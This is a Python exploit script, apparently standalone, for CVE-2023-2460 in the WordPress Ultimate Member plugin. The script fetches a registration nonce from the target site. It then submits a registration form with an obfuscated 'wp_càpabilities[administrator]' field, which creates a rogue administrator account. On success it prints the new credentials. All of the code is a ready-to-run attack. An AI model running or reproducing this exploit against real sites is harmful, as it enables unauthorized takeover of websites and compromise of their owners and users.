#Ultimate Member Vulnerability (CVE-2023-2460) Exploit
#by Rajneesh Kumar Arya

import re
import sys
import urllib3
import requests
import argparse
from termcolor import colored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

email = "exploit@rajneesh.com"

def check(paswd):
    lw = 0
    up = 0
    dig = 0
    l = len(password)
    for char in paswd:
        if char.islower():
            lw = 1
            break
    for char in paswd:
        if char.isupper():
            up = 1
            break
    for char in paswd:
        if char.isdigit():
            dig = 1
            break
    return ((lw and up and dig and (l>=8)) == 1)

def add_admin(target, form_id,username,password):
    headers = {
        "User-Agent": "kairaj Security Agent"
    }

    print("nonce value :", end=' ')
    s = requests.Session()
    try:
        r = s.get(f"{target}/index.php/register/", headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print(colored(f"{nonce}", "green"))
    except:
        print(colored("error...", "red"))
        exit()

    data = {
        f"user_login-{form_id}": username,
        f"user_email-{form_id}": email,
        f"user_password-{form_id}": password,
        f"confirm_user_password-{form_id}": password,
        f"first_name-{form_id}": "Exploit",
        f"last_name-{form_id}": "Success",
        "form_id": form_id,
        "um_request": '',
        "_wpnonce": nonce,
        "wp_c√†pabilities[administrator]": 1
    }

    print(f"Attacking {target} :", end=' ')
    r = s.post(f"{target}/index.php/register/", data=data, headers=headers, verify=False)
    if r.history[0].status_code == 302:
        print(colored("done", "green"))
    else:
        print(colored("error...", "red"))
        exit()

    print()
    print(colored("Congratulations! We gained access to admin panel:", "green"))
    print("Credentials...")
    print(colored(f"Username: {username}", "yellow"))
    print(colored(f"Password: {password}", "yellow"))
    print()


if __name__ == '__main__':
    print()
    print(colored("\t\t --- Ultimate Member Exploit ---", "cyan"))
    print("\t\t   (Get Admin Access)")
    print(colored("\t\t\t\t\tby Rajneesh K Arya", "cyan"))

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="http://wphost")

    if len(sys.argv) == 1:
        parser.print_help()
        print()
        exit()

    args = parser.parse_args()

    form_id = int(input("id : "))
    username = input("Username : ")
    password = input("Password : ")

    if(check(password)):
        add_admin(args.url, form_id,username,password)
    else:
        print(colored('Your password should has at least 8 characters and must contain [A-Z;a-z;0-9]'))
        exit()
